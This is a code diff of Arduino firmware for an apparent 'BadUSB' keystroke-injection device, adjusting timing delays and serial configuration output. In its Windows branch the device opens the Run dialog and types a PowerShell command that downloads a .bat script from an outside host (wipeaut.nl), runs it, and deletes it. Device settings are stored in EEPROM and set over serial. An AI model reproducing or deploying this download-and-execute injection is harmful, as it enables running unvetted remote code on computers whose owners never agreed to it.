@@ -16,13 +16,12 @@ void exec() {
   if(os == 0) {
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('r');
-    delay(100);
+    delay(300);
     Keyboard.releaseAll();
-    Keyboard.print("cmd /c "+dqt+"cd %userprofile%\\Downloads && powershell \\"+dqt+"(New-Object System.Net.WebClient).DownloadFile("+sqt+"https://wipeaut.nl/badusb/win/"+sc+".bat"+sqt+", "+sqt+sc+".bat"+sqt+"\\"+dqt+" && "+sc+".bat && del "+sc+".bat"+dqt);
+    Keyboard.print("cmd /c "+d+"cd %userprofile%\\Downloads && powershell "+d+"(New-Object System.Net.WebClient).DownloadFile("+s+"https://wipeaut.nl/badusb/win/"+sc+".bat"+s+", "+s+sc+".bat"+s+")"+d+" && "+sc+".bat && del "+sc+".bat"+d);
+    delay(150);
     Keyboard.press(KEY_RETURN);
-    delay(100);
     Keyboard.releaseAll();
-    delay(500);
   } else if(os == 1) {
     // TODO: Mac
   } else if(os == 2) {
@@ -38,12 +37,12 @@ void setup() {
     }
   }
 
-  Serial.begin(9600);
-  Serial.println("bad:"+String(EEPROM.read(0))+":"+String(EEPROM.read(1))+":"+String(EEPROM.read(2)));
+  Serial.begin(115200);
 
-  delay(400);
+  delay(800);
 
   if(Serial.available() != 0) {
+    Serial.println("bad:"+String(EEPROM.read(0))+":"+String(EEPROM.read(1))+":"+String(EEPROM.read(2)));
     Serial.readString();
 
     while(true) {
@@ -58,15 +57,19 @@ void setup() {
       // write the os
       if(label == "os") {
         EEPROM.write(0, val.toInt());
+        Serial.println("OS: "+String(val.toInt()));
       // write the quotes
       } else if(label == "qu") {
         EEPROM.write(1, val.toInt());
+        Serial.println("QUOTES: "+String(val.toInt()));
       // write the script
       } else if(label == "sc") {
         EEPROM.write(2, val.toInt());
+        Serial.println("SCRIPT: "+String(val.toInt()));
       // run the script
       } else if(label == "ru") {
         exec();
+        Serial.println("RUNNING SCRIPT");
       }
     }
   } else {
